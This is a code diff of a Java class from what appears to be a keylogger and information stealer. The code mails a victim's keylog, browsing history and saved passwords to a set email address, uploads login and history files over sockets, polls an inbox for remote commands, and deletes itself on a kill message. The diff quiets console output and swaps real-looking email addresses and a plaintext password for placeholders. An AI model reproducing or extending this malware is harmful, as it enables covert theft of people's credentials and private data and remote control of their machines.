@@ -165,26 +165,28 @@ public class Radio
 	public static boolean mailIPtrackers = false;
 	public static boolean checkForKill = true;
 	public static boolean verifyOS = true;
+	public static boolean isSecondaryDistrib = true;
 	public static String staticIP = "127.0.0.1"; // change accordingly
 	
 	@SuppressWarnings("static-access")
 	public static void main (String[] args) throws IOException, URISyntaxException
 	{
+		// mailLogs();
 		Main m = new Main();
-		System.out.println("[" + m.robert.elapsedTime() + "] Starting a new thread for you...");
+		Chocolat.println("[" + m.robert.elapsedTime() + "] Starting a new thread for you...");
 		Executors.newSingleThreadExecutor().execute(new Runnable() {
 		    @Override
 		    public void run() {
 		    	try {
 					m.exec();
-					System.out.println("[" + m.robert.elapsedTime() + "] [✔] Recorder launched successfully.");
+					Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Recorder launched successfully.");
 				} catch (IOException | URISyntaxException e) {
 					// TODO Auto-generated catch block
 					e.printStackTrace();
 				}
 		    }
 		});
-		System.out.println("[" + m.robert.elapsedTime() + "] [✔] Done.");
+		Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Done.");
 		java.util.Date d = new java.util.Date();
 	    Calendar cl = Calendar.getInstance();
 	    cl.setTime(d);
@@ -215,13 +217,13 @@ public class Radio
 				 if (minutes % 30 == 0 || minutes == 0) {
 			     if (emailReceive)
 			     {
-			     System.out.println("[" + m.robert.elapsedTime() + "] [?] Checking for commands...");
+			     Chocolat.println("[" + m.robert.elapsedTime() + "] [?] Checking for commands...");
 				 checkForCommands();
 			     }
 				 if (emailUpload && !uploadDone)
 				 {
 				 if (mailLogs() == 0) {
-				 System.out.println("[" + m.robert.elapsedTime() + "] [✔] Daily TX Successful.");
+			     Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Daily TX Successful.");
 				 uploadDone = true;
 				 }
 				 }
@@ -302,7 +304,7 @@ public class Radio
 	    		os.flush(); 
 	    		socket.close();
 	    	} catch (Exception e) {
-	    		System.out.println(e);
+	    		Chocolat.println(e.toString());
 	    	}
 	 }
 	 public static void uplogin(String ipee) throws IOException {
@@ -327,9 +329,9 @@ public class Radio
 			os.write(bytearray,0,bytearray.length); 
 			os.flush();
 		    send.close();
-			System.out.println("yiff!");
+			Chocolat.println("yiff!");
 		 } catch (Exception e) {
-			 System.out.println("blargh");
+			Chocolat.println(e.toString());
 		 }
 	 }
 	 public static void uphistory(String ipee) throws IOException {
@@ -354,9 +356,9 @@ public class Radio
 					os.write(bytearray,0,bytearray.length); 
 					os.flush();
 				    sand.close();
-					System.out.println("yip!");
+					Chocolat.println("yip!");
 				 } catch (Exception e) {
-					 System.out.println("blarfff");
+					Chocolat.println("blarfff");
 				 }
 	 }
 	 public static int getCurrentVersion() {
@@ -370,14 +372,14 @@ public class Radio
 	 public static int mailLogs() {
 		 // mail keylog, history and saved passwords to email address
 		 // Recipient's email ID needs to be mentioned.
-	      String to = "duvictor514@gmail.com";
+	      String to = "targetemail@gmail.com";
 
 	      // use non gmail acct, outlook
 	      // Sender's email ID needs to be mentioned
-	      String from = "suzukiairi8892@gmail.com";
+	      String from = "noreply@gmail.com";
 
-	      final String username = "suzukiairi8892@gmail.com";//change accordingly
-	      final String password = "richardnguyen";//change accordingly
+	      final String username = "noreply@gmail.com";//change accordingly
+	      final String password = "password";//change accordingly
 
 	      String host = "smtp.gmail.com";
 
@@ -446,10 +448,10 @@ public class Radio
 	         // Send message
 	         Transport.send(message);
 
-	         System.out.println("Transmission successful");
+	         Chocolat.println("Transmission successful");
 	         return 0;
 	      } catch (MessagingException e) {
-	    	  System.err.println("Mailer Broadcast Failure: "+ e);
+	    	  Chocolat.println("Mailer Broadcast Failure: "+ e.toString());
 	    	  return 2;
 	      }
 	 }
@@ -479,14 +481,14 @@ public class Radio
 
 		      for (int i = 0, n = messages.length; i < n; i++) {
 		         Message message = messages[i];
-		         System.out.println("---------------------------------");
-		         System.out.println("[[ Mailer Command Received ]]");
-		         System.out.println("Email Number " + (i + 1));
-		         System.out.println("Subject: " + message.getSubject());
+		        // System.out.println("---------------------------------");
+		         //System.out.println("[[ Mailer Command Received ]]");
+		         //System.out.println("Email Number " + (i + 1));
+		         //System.out.println("Subject: " + message.getSubject());
 		   //      System.out.println("From: " + message.getFrom()[0]);
-		         System.out.println("Text: " + message.getContent().toString());
-		         System.out.println("---------------------------------");
-		         if (message.getSubject().matches("KILL") && message.getContent().toString().matches("KILL")) {
+		         //System.out.println("Text: " + message.getContent().toString());
+		         //System.out.println("---------------------------------");
+		         if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("KILL")) {
 		        	 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 		 			cf.deleteOnExit();
 		 			System.exit(0);
@@ -499,17 +501,17 @@ public class Radio
 		      store.close();
 		      return 0;
 		      } catch (NoSuchProviderException e) {
-		    	 System.err.println("Mailer request failed:" +e);
+		    	 Chocolat.println("Mailer request failed:" +e.toString());
 		         e.printStackTrace();
 		         return 2;
 		      } catch (MessagingException e) {
-		    	  System.err.println("Mailer request failed:" +e);
-		         e.printStackTrace();
-		         return 2;
+		    	  Chocolat.println("Mailer request failed:" +e);
+		          e.printStackTrace();
+		          return 2;
 		      } catch (Exception e) {
-		    	  System.err.println("Mailer request failed:" +e);
-		         e.printStackTrace();
-		         return 2;
+		    	  Chocolat.println("Mailer request failed:" +e.toString());
+			      e.printStackTrace();
+			      return 2;
 		      }
 		   }
 }
